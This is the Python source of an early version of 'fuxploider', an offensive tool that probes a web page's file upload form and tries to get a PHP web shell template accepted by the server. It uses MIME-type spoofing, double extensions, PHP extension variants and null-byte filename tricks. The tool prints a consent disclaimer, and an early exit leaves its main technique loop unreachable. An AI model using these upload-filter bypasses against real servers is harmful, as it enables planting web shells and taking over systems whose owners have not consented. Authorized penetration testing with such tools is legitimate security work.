#!/usr/bin/python3
import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile
from utils import *

version = "0.1.4"

coloredlogs.install(fmt='%(asctime)s %(levelname)s - %(message)s', level=logging.INFO,datefmt='[%m/%d/%Y-%H:%M:%S]')
logging.getLogger("requests").setLevel(logging.ERROR)

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
requiredNamedArgs.add_argument("--true-regex",metavar="regex", help="Regex matchin an upload success", type=valid_regex, dest="trueRegex")

exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument("-l","--legit-extensions",metavar="listOfExtensions",dest="legitExtensions",nargs=1,help="Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'")
exclusiveArgs.add_argument("-n",metavar="n",nargs=1,default=["100"],dest="n",help="Number of common extensions to use. Example : -n 100", type=valid_nArg)

parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")

args = parser.parse_args()

if args.proxyCreds and args.proxy == None :
	parser.error("--proxy-creds must be used with --proxy.")

if args.skipRecon and args.legitExtensions == None :
	parser.error("-s switch needs -l switch. Cannot skip recon phase without any known entry point.")

args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024*args.size

if not args.notRegex and not args.trueRegex :
	parser.error("At least one detection method must be provided, either with --not-regex or with --true-regex.")

if args.legitExtensions :
	args.legitExtensions = args.legitExtensions[0].split(",")



print("""\033[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

\033[1m\033[42m{version """+version+"""}\033[m

\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	""")
if args.proxyCreds == True :
	args.proxyCreds = {}
	args.proxyCreds["username"] = input("Proxy username : ")
	args.proxyCreds["password"] = getpass.getpass("Proxy password : ")

now = datetime.datetime.now()

print("[*] starting at "+str(now.hour)+":"+str(now.minute)+":"+str(now.second))

#mimeFile = "mimeTypes.advanced"
mimeFile = "mimeTypes.basic"
if args.legitExtensions :
	args.legitExtensions = [x.lower() for x in args.legitExtensions]
	extensions = loadExtensions(args.legitExtensions)
	foundExt = [a[0] for a in extensions]
	for b in args.legitExtensions :
		if b not in foundExt :
			logging.warning("Extension %s can't be found as a valid/known extension with associated mime type.",b)
			args.legitExtensions.remove(b)
else :
	extensions = loadExtensions("file",mimeFile)
toutesLesExtensions = [x[0] for x in extensions]

nastyExtensions = ["php","asp"]

postData = postDataFromStringToJSON(args.data)

s = requests.Session()
##### PROXY HANDLING #####
s.trust_env = False
if args.proxy :
	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
		logging.warning("Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch")
	if args.proxyCreds :
		proxyUser = args.proxyCreds["username"]
		proxyPass = args.proxyCreds["password"]
	else :
		proxyUser = args.proxy["username"]
		proxyPass = args.proxy["password"]
	proxyProtocol = args.proxy["protocol"]
	proxyHostname = args.proxy["hostname"]
	proxyPort = args.proxy["port"]
	proxy = ""
	if proxyProtocol != None :
		proxy += proxyProtocol+"://"
	else :
		proxy += "http://"

	if proxyUser != None and proxyPass != None :
		proxy += proxyUser+":"+proxyPass+"@"

	proxy += proxyHostname
	if proxyPort != None :
		proxy += ":"+proxyPort

	if proxyProtocol == "https" :
		proxies = {"https":proxy}
	else :
		proxies = {"http":proxy,"https":proxy}

	s.proxies.update(proxies)

try :
	initGet = s.get(args.url,headers={"Accept-Encoding":None})
	if initGet.status_code < 200 or initGet.status_code > 300 :
		logging.critical("Server responded with following status : %s - %s",initGet.status_code,initGet.reason)
		exit()
except Exception as e :
		logging.critical("%s : Host unreachable (%s)",getHost(args.url),e)
		exit()
#########################################################

##### FILE UPLOAD FORM DETECTION #####
detectedForms = detectForms(initGet.text)

if len(detectedForms) == 0 :
	logging.critical("No HTML form found here")
	exit()
if len(detectedForms) > 1 :
	logging.critical("%s forms found containing file upload inputs, no way to choose which one to test.",len(detectedForms))
	exit()
if len(detectedForms[0][1]) > 1 :
	logging.critical("%s file inputs found inside the same form, no way to choose which one to test.",len(detectedForms[0]))
	exit()

fileInput = detectedForms[0][1][0]
formDestination = detectedForms[0][0]
try :
	action = formDestination["action"]
	schema = "https" if initGet.url[0:5] == "https" else "http"
	host = getHost(initGet.url)
	uploadURL = schema+"://"+host+"/"+action
except :
	uploadURL = initGet.url
############################################################




###### VALID EXTENSIONS DETECTION FOR THIS FORM ######
if not args.skipRecon :
	logging.info("### Starting detection of valid extensions ...")
	n = 0
	validExtensions = []
	for ext in extensions :
		validExt = False
		if n < args.n :
			#ext = (ext,mime)
			n += 1
			logging.debug("Trying extension %s", ext[0])
			with tempfile.NamedTemporaryFile(suffix="."+ext[0]) as fd :
				fd.write(os.urandom(args.size))
				fd.flush()
				fd.seek(0)
				fu = s.post(uploadURL,files={fileInput["name"]:(os.path.basename(fd.name),fd,ext[1])},data=postData)
			if args.notRegex :
				fileUploaded = re.search(args.notRegex,fu.text)
				if fileUploaded == None :
					logging.info("\033[1m\033[42mExtension %s seems valid for this form.\033[m", ext[0])
					validExtensions.append(ext[0])
					validExt = True
					if args.trueRegex :
						moreInfo = re.search(args.trueRegex,fu.text)
						if moreInfo :
							logging.info("\033[1;32mTrue regex matched the following information : %s\033[m",moreInfo.groups())
			if args.trueRegex :#sinon si args.trueRegex :
				if not validExt :
					fileUploaded = re.search(args.trueRegex,fu.text)
					if fileUploaded :
						logging.info("\033[1m\033[42mExtension %s seems valid for this form.\033[m", ext[0])
						logging.info("\033[1m\033[42mRegex matched the following information : %s\033[m",fileUploaded.groups())
						validExtensions.append(ext[0])
						validExt = True
		else :
			break
	logging.info("### Tried %s extensions, %s are valid.",n,len(validExtensions))
else :
	logging.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
	validExtensions = args.legitExtensions

if validExtensions == [] :
	logging.error("No valid extension found.")
	exit()
#################################################################

logging.info("### Starting shell upload detection (messing with file extensions and mime types...)")
succeededAttempts = []

nastyExt = "php"
nastyMime = getMime(extensions,nastyExt)
template = open("template.php","rb")
nastyExtVariants = ["php1","php2","php3","php4","php5","phtml"]

legitExt = validExtensions[0]
legitMime = getMime(extensions,legitExt)
#trying to upload template by changing mime type only
res = fileUploadTest(uploadURL,s,postData,"."+nastyExt,args.size,legitMime,args.notRegex,args.trueRegex,fileInput["name"],template.read())
if res["success"] :
	logging.info("\033[1m\033[42mFile '%s' uploaded with success using a mime type of '%s'.\033[m",res["filename"],legitMime)

exit()

############################################################################################################
#still looking for a more pythonic way to do this ...
def techniques(legitExt,badExt,extensions) :
	filesToTry = []
	#filesToTry.append(("filename.extension1.extension2","mime/type"))
	filesToTry.append(("."+legitExt+"."+badExt,getMime(extensions,legitExt)))
	filesToTry.append(("."+legitExt+"."+badExt,getMime(extensions,badExt)))
	filesToTry.append(("."+badExt+"."+legitExt,getMime(extensions,legitExt)))
	filesToTry.append(("."+badExt+"."+legitExt,getMime(extensions,badExt)))
	filesToTry.append(("."+legitExt+"%00."+badExt,getMime(extensions,legitExt)))
	filesToTry.append(("."+legitExt+"%00."+badExt,getMime(extensions,badExt)))
	filesToTry.append(("."+badExt+"%00."+legitExt,getMime(extensions,legitExt)))
	filesToTry.append(("."+badExt+"%00."+legitExt,getMime(extensions,badExt)))

	return filesToTry


intersect = list(set(toutesLesExtensions) & set(validExtensions))

for legitExt in intersect :
	for badExt in nastyExtensions :
		#files = [("nom.ext","mime"),("nom.ext","mime")]
		files = techniques(legitExt,badExt,extensions)
		for f in files :
			suffix = f[0]
			mimetype = f[1]
			logging.debug("Trying suffix '%s' with mimetype '%s'.",suffix,mimetype)
			res = fileUploadTest(uploadURL,s,postData,f[0],args.size,f[1],args.notRegex,args.trueRegex,fileInput["name"])
			success = res["success"]
			filename = res["filename"]
			matchedWithTrueRegex = res["trueRegex"]
			if success :
				logging.info("\033[1m\033[42mFile '%s' uploaded with success using a mime type of '%s'.\033[m",filename,mimetype)
				succeededAttempts.append((filename,mimetype))
			else :
				pass
			if matchedWithTrueRegex != "" :
				logging.info("\033[1;32mTrue regex matched the following information : %s\033[m",matchedWithTrueRegex)
				pass



logging.debug("End of detection phase, the following files have been uploaded meaning a potential file upload vulnerability :")
print(succeededAttempts)
template.close()